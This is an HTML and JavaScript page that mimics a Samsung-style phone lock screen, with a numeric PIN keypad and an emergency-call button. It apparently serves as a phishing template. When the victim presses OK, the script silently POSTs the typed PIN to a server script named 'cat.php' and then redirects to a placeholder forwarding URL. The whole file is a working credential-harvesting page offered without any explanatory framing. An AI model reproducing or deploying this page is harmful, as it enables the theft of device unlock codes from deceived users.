<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
<meta name="viewport" content="width=device-width, initial-scale=1"; charset="utf-8">
<style>
@import url(https://fonts.googleapis.com/css?family=Droid+Sans);
@import url(https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css);
* { padding: 0; margin: 0; -webkit-user-select: none; user-select: none; }
html,body { overflow: hidden; }
#content {
  height: 100%; overflow: hidden; font-size: 16px; font-family: "Droid Sans";
  background: url("https://img.xda-cdn.com/mPf-MsckWG4QyfuYcxHzAISI77s=/http%3A%2F%2Fsamsung-wallpapers.com%2Fuploads%2Fallimg%2F150301%2F1-150301203Q2.jpg") no-repeat center center fixed; 
  background-size: cover;
}
#content::after{ content:""; background:rgba(0,0,0,.7); width:100%; height:100%; position:absolute; left:0; top:0; z-index:1; }
.button { z-index:10; border-radius: 1vh; position:relative; background-color: transparent; font-size: 2.3vh; color: white; border: none; outline:0; }
.footer { z-index:10; position: absolute; left: 0; bottom: 2vh; right: 0; height: 4vh; line-height: 4vh; font-size: 1.5vh; text-align: center; }
.panel { z-index:10; position: absolute; left: 0; top: 39%; right: 0; bottom: 4%; background:transparent; }
.panel .title { font-size: 3vh; font-family: sans-serif; text-align: center; margin: 1% 0; padding: 1vh; color: #FFF; font-weight: normal; }
.panel .field { z-index:10; vertical-align: middle; margin: 1vh 10vw; height: 6vh; line-height: 8vh; text-align: center; border-radius: 10px; background: #585858; color: #FFF; font-size: 6vh; opacity: 0.9; -webkit-text-security:disc; }
.panel .keyboard .line { height: 9vh; text-align: center; }
.panel .keyboard .line .btn { margin: 2vh 2vw; padding: 2vh 2vw; display: inline-block; width: 18vw; height: 7vh; cursor: pointer; text-align: center; font-size: 5vh; color: white; border: 0px; }
</style>
</head>
<body>
<div class="content" id="content">
  <div class="panel">
    <div class="title">PIN Code:</div>
    <div class="field"></div>
    <div class="keyboard">
      <div class="line"><div class="btn" key="1">1</div><div class="btn" key="2">2</div><div class="btn" key="3">3</div></div>
      <div class="line"><div class="btn" key="4">4</div><div class="btn" key="5">5</div><div class="btn" key="6">6</div></div>
      <div class="line"><div class="btn" key="7">7</div><div class="btn" key="8">8</div><div class="btn" key="9">9</div></div>
      <div class="line"><div class="btn fa fa-arrow-left" key="-1"></div><div class="btn" key="0">0</div><div class="btn" key="-3">OK</div></div>
    </div>
  </div>
  <div class="footer"><button class="button">EMERGENCY CALL</button></div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script type="text/javascript">
(function () {
  var num = "";
  $(".btn").on("click", function (e) {
    var v = $(this).attr('key');
    if (v == "-1") { num = num.slice(0, num.length - 1); }
    else if (v == "-3") {
        $.ajax({ type: 'POST', url: 'cat.php', data: { 'pin': num } });
        num = ""; window.location.replace("forwarding_url");
    } else { num += v; }
    return $(".field").text(num);
  });
}).call(this);
</script>
</body>
</html>
